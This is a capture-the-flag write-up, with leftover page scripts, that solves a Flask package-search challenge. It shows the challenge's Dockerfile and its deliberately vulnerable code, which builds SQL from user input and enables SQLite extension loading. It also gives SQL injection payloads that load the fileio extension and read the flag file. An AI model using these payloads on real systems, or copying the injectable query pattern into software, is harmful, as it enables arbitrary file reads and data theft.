<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M14.25.18l.9.2.73.26.59.3.45.32.34.34.25.34.16.33.1.3.04.26.02.2-.01.13V8.5l-.05.63-.13.55-.21.46-.26.38-.3.31-.33.25-.35.19-.35.14-.33.1-.3.07-.26.04-.21.02H8.77l-.69.05-.59.14-.5.22-.41.27-.33.32-.27.35-.2.36-.15.37-.1.35-.07.32-.04.27-.02.21v3.06H3.17l-.21-.03-.28-.07-.32-.12-.35-.18-.36-.26-.36-.36-.35-.46-.32-.59-.28-.73-.21-.88-.14-1.05-.05-1.23.06-1.22.16-1.04.24-.87.32-.71.36-.57.4-.44.42-.33.42-.24.4-.16.36-.1.32-.05.24-.01h.16l.06.01h8.16v-.83H6.18l-.01-2.75-.02-.37.05-.34.11-.31.17-.28.25-.26.31-.23.38-.2.44-.18.51-.15.58-.12.64-.1.71-.06.77-.04.84-.02 1.27.05zm-6.3 1.98l-.23.33-.08.41.08.41.23.34.33.22.41.09.41-.09.33-.22.23-.34.08-.41-.08-.41-.23-.33-.33-.22-.41-.09-.41.09zm13.09 3.95l.28.06.32.12.35.18.36.27.36.35.35.47.32.59.28.73.21.88.14 1.04.05 1.23-.06 1.23-.16 1.04-.24.86-.32.71-.36.57-.4.45-.42.33-.42.24-.4.16-.36.09-.32.05-.24.02-.16-.01h-8.22v.82h5.84l.01 2.76.02.36-.05.34-.11.31-.17.29-.25.25-.31.24-.38.2-.44.17-.51.15-.58.13-.64.09-.71.07-.77.04-.84.01-1.27-.04-1.07-.14-.9-.2-.73-.25-.59-.3-.45-.33-.34-.34-.25-.34-.16-.33-.1-.3-.04-.25-.02-.2.01-.13v-5.34l.05-.64.13-.54.21-.46.26-.38.3-.32.33-.24.35-.2.35-.14.33-.1.3-.06.26-.04.21-.02.13-.01h5.84l.69-.05.59-.14.5-.21.41-.28.33-.32.27-.35.2-.36.15-.36.1-.35.07-.32.04-.28.02-.21V6.07h2.09l.14.01zm-6.47 14.25l-.23.33-.08.41.08.41.23.33.33.23.41.08.41-.08.33-.23.23-.33.08-.41-.08-.41-.23-.33-.33-.23-.41-.08-.41.08z"></path></svg> <!-- -->py<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">db</span><span class="token punctuation">.</span><span class="">enable_load_extension</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre></div></div>
<p>which <a href="https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.enable_load_extension">enables the SQLite <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">load_extension()</code> function</a> for loading <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">.so</code> extension files.</p>
<p>Looking at the Dockerfile,</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.983 11.078h2.119a.186.186 0 00.186-.185V9.006a.186.186 0 00-.186-.186h-2.119a.185.185 0 00-.185.185v1.888c0 .102.083.185.185.185m-2.954-5.43h2.118a.186.186 0 00.186-.186V3.574a.186.186 0 00-.186-.185h-2.118a.185.185 0 00-.185.185v1.888c0 .102.082.185.185.185m0 2.716h2.118a.187.187 0 00.186-.186V6.29a.186.186 0 00-.186-.185h-2.118a.185.185 0 00-.185.185v1.887c0 .102.082.185.185.186m-2.93 0h2.12a.186.186 0 00.184-.186V6.29a.185.185 0 00-.185-.185H8.1a.185.185 0 00-.185.185v1.887c0 .102.083.185.185.186m-2.964 0h2.119a.186.186 0 00.185-.186V6.29a.185.185 0 00-.185-.185H5.136a.186.186 0 00-.186.185v1.887c0 .102.084.185.186.186m5.893 2.715h2.118a.186.186 0 00.186-.185V9.006a.186.186 0 00-.186-.186h-2.118a.185.185 0 00-.185.185v1.888c0 .102.082.185.185.185m-2.93 0h2.12a.185.185 0 00.184-.185V9.006a.185.185 0 00-.184-.186h-2.12a.185.185 0 00-.184.185v1.888c0 .102.083.185.185.185m-2.964 0h2.119a.185.185 0 00.185-.185V9.006a.185.185 0 00-.184-.186h-2.12a.186.186 0 00-.186.186v1.887c0 .102.084.185.186.185m-2.92 0h2.12a.185.185 0 00.184-.185V9.006a.185.185 0 00-.184-.186h-2.12a.185.185 0 00-.184.185v1.888c0 .102.082.185.185.185M23.763 9.89c-.065-.051-.672-.51-1.954-.51-.338.001-.676.03-1.01.087-.248-1.7-1.653-2.53-1.716-2.566l-.344-.199-.226.327c-.284.438-.49.922-.612 1.43-.23.97-.09 1.882.403 2.661-.595.332-1.55.413-1.744.42H.751a.751.751 0 00-.75.748 11.376 11.376 0 00.692 4.062c.545 1.428 1.355 2.48 2.41 3.124 1.18.723 3.1 1.137 5.275 1.137.983.003 1.963-.086 2.93-.266a12.248 12.248 0 003.823-1.389c.98-.567 1.86-1.288 2.61-2.136 1.252-1.418 1.998-2.997 2.553-4.4h.221c1.372 0 2.215-.549 2.68-1.009.309-.293.55-.65.707-1.046l.098-.288Z"></path></svg> <!-- -->dockerfile<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token instruction keyword">FROM</span><span class="token instruction"> ghcr.io/astral-sh/uv:debian</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> wget https://sqlite.org/src/tarball/sqlite.tar.gz?r=release -O sqlite.tar.gz</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> tar xf sqlite.tar.gz</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class=""></span><span class="token instruction keyword">WORKDIR</span><span class="token instruction"> /sqlite</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> ./configure</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> make -j$(nproc)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class=""></span><span class="token instruction keyword">WORKDIR</span><span class="token instruction"> /sqlite/ext/misc</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> for f in *; do gcc -g -fPIC -shared </span><span class="token instruction variable">$f</span><span class="token instruction"> -o </span><span class="token instruction string">&quot;${f%.c}.so&quot;</span><span class="token instruction">; done</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class=""></span><span class="token instruction keyword">ADD</span><span class="token instruction"> main.py pyproject.toml uv.lock seed.sql flag.txt /app/</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token instruction keyword">WORKDIR</span><span class="token instruction"> /app/</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> /sqlite/sqlite3 packages.db &lt; seed.sql</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class=""></span><span class="token instruction keyword">RUN</span><span class="token instruction"> uv sync --locked</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class=""></span><span class="token instruction keyword">USER</span><span class="token instruction"> 1000</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class=""></span><span class="token instruction keyword">ENV</span><span class="token instruction"> PYTHONUNBUFFERED=1</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class=""></span><span class="token instruction keyword">CMD</span><span class="token instruction"> .venv/bin/python3 main.py</span></code></pre></div></div>
<p>they&#x27;ve conveniently compiled all extensions in <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">sqlite/ext/misc</code> to <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">.so</code> files, and we can load them at will with</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">SELECT</span><span class=""> load_extension</span><span class="token punctuation">(</span><span class="token string">&#x27;/sqlite/ext/misc/{...}.so&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div></div>
<p>So which of <a href="https://github.com/sqlite/sqlite/tree/master/ext/misc">these extensions</a> seem helpful? Conveniently, <a href="https://github.com/sqlite/sqlite/blob/master/ext/misc/fileio.c"><code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">fileio</code></a> defines <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">readfile()</code> and <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">writefile()</code> functions for SQL:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16.5921 9.1962s-.354-3.298-3.627-3.39c-3.2741-.09-4.9552 2.474-4.9552 6.14 0 3.6651 1.858 6.5972 5.0451 6.5972 3.184 0 3.5381-3.665 3.5381-3.665l6.1041.365s.36 3.31-2.196 5.836c-2.552 2.5241-5.6901 2.9371-7.8762 2.9201-2.19-.017-5.2261.034-8.1602-2.97-2.938-3.0101-3.436-5.9302-3.436-8.8002 0-2.8701.556-6.6702 4.047-9.5502C7.444.72 9.849 0 12.254 0c10.0422 0 10.7172 9.2602 10.7172 9.2602z"></path></svg> <!-- -->c<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token comment">/*
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>** 2014-06-13
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span>** The author disclaims copyright to this source code.  In place of
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span>** a legal notice, here is a blessing:
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span>**    May you do good and not evil.
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span>**    May you find forgiveness for yourself and forgive others.
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span>**    May you share freely, never taking more than you give.
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span>******************************************************************************
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span>** This SQLite extension implements SQL functions readfile() and
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span>** writefile(), and eponymous virtual type &quot;fsdir&quot;.
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span>** ...
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">17</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">18</span>** READFILE(FILE):
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">19</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">20</span>**   Read and return the contents of file FILE (type blob) from disk.
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">21</span>**
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">22</span>** ...
</span><span class="token comment"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">23</span>*/</span></code></pre></div></div>
<p>Thus, we can simply query</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">&quot;</span><span class="token operator">OR</span><span class=""> </span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class=""> </span><span class="token keyword">UNION</span><span class=""> </span><span class="token keyword">SELECT</span><span class=""> load_extension</span><span class="token punctuation">(</span><span class="token string">&#x27;/sqlite/ext/misc/fileio.so&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">--</span></code></pre></div></div>
<p>to load the <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">fileio</code> extension (we need <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">UNION SELECT</code> since we are tacking this onto the end of an existing query, and <code class="font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]">UNION SELECT</code> requires both sides of the query to have the same number of columns), and</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<!-- --> (sql)<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">&quot;</span><span class="token operator">OR</span><span class=""> </span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class=""> </span><span class="token keyword">UNION</span><span class=""> </span><span class="token keyword">SELECT</span><span class=""> readfile</span><span class="token punctuation">(</span><span class="token string">&#x27;/app/flag.txt&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class="token punctuation">,</span><span class=""> </span><span class="token number">1</span><span class=""> </span><span class="token keyword">from</span><span class=""> packages</span><span class="token punctuation">;</span><span class="token comment">--</span></code></pre></div></div>
<p>to read the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/2608bd98-1ec8-43f4-8a5a-bbe3e6cfd080" alt="img"/></p></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/9563dab5ba30607d.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n4:I[22016,[\"/_next/static/chunks/44838f11011a9f2d.js\"],\"\"]\n6:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"OutletBoundary\"]\n7:\"$Sreact.suspense\"\n9:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"ViewportBoundary\"]\nb:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"MetadataBoundary\"]\nd:I[68027,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n:HL[\"/_next/static/chunks/0ae28dad4c293945.css\",\"style\"]\n:HL[\"/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"fiMZXb3kDk3bbcp3CO5oo\",\"c\":[\"\",\"writeups\",\"e4fd9a90929b465c0c39151e5ea76fdc\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"e4fd9a90929b465c0c39151e5ea76fdc\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0ae28dad4c293945.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":[]}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/44838f11011a9f2d.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/03f4569ba78edab9.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/39b99946d2be6a43.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-3\",{\"src\":\"/_next/static/chunks/116d3b69f07f8eb7.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L6\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@8\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$L9\",null,{\"children\":\"$@a\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@c\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"e:I[10453,[\"/_next/static/chunks/44838f11011a9f2d.js\",\"/_next/static/chunks/03f4569ba78edab9.js\",\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"/_next/static/chunks/39b99946d2be6a43.js\",\"/_next/static/chunks/116d3b69f07f8eb7.js\"],\"default\"]\nf:T9d2,"])</script><script>self.__next_f.push([1,"import sqlite3\nimport json\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n\ndb = sqlite3.connect(\"packages.db\", check_same_thread=False)\ndb.enable_load_extension(True)\ndb.row_factory = sqlite3.Row\n\nTEMPLATE = \"\"\"\n\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003ctitle\u003ePackage Search\u003c/title\u003e\n    \u003cstyle\u003e\n        body { font-family: sans-serif; max-width: 800px; margin: 2rem auto; }\n        form { margin-bottom: 1rem; }\n        table { border-collapse: collapse; width: 100%; }\n        th, td { border: 1px solid #ccc; padding: 0.5rem; text-align: left; }\n        th { background: #f4f4f4; }\n    \u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    \u003ch1\u003ePackage Search\u003c/h1\u003e\n    \u003cform method=\"get\"\u003e\n        \u003clabel\u003eDistro:\n            \u003cinput name=\"distro\" value=\"{{ request.args.get('distro', '') }}\"\u003e\n        \u003c/label\u003e\n        \u003clabel\u003ePackage:\n            \u003cinput name=\"package\" value=\"{{ request.args.get('package', '') }}\"\u003e\n        \u003c/label\u003e\n        \u003cbutton type=\"submit\"\u003eSearch\u003c/button\u003e\n    \u003c/form\u003e\n\n    {% if results %}\n        \u003ch2\u003eShowing {{ results|length }} result{{ 's' if results|length != 1 else '' }}\u003c/h2\u003e\n        \u003ctable\u003e\n            \u003ctr\u003e\n                \u003cth\u003eDistro\u003c/th\u003e\n                \u003cth\u003eDistro Version\u003c/th\u003e\n                \u003cth\u003ePackage\u003c/th\u003e\n                \u003cth\u003ePackage Version\u003c/th\u003e\n            \u003c/tr\u003e\n            {% for row in results %}\n                \u003ctr\u003e\n                    \u003ctd\u003e{{ row['distro'] }}\u003c/td\u003e\n                    \u003ctd\u003e{{ row['distro_version'] }}\u003c/td\u003e\n                    \u003ctd\u003e{{ row['package'] }}\u003c/td\u003e\n                    \u003ctd\u003e{{ row['package_version'] }}\u003c/td\u003e\n                \u003c/tr\u003e\n            {% endfor %}\n        \u003c/table\u003e\n    {% else %}\n        \u003cp\u003eNo results found.\u003c/p\u003e\n    {% endif %}\n\u003c/body\u003e\n\u003c/html\u003e\n\"\"\"\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    distro = request.args.get(\"distro\", \"\").strip().lower()\n    package = request.args.get(\"package\", \"\").strip().lower()\n\n    sql = \"SELECT distro, distro_version, package, package_version FROM packages\"\n    if distro or package:\n        sql += \" WHERE \"\n    if distro:\n        sql += f\"LOWER(distro) = {json.dumps(distro)}\"\n    if distro and package:\n        sql += \" AND \"\n    if package:\n        sql += f\"LOWER(package) = {json.dumps(package)}\"\n    sql += \" ORDER BY distro, distro_version, package\"\n\n    print(sql)\n    results = 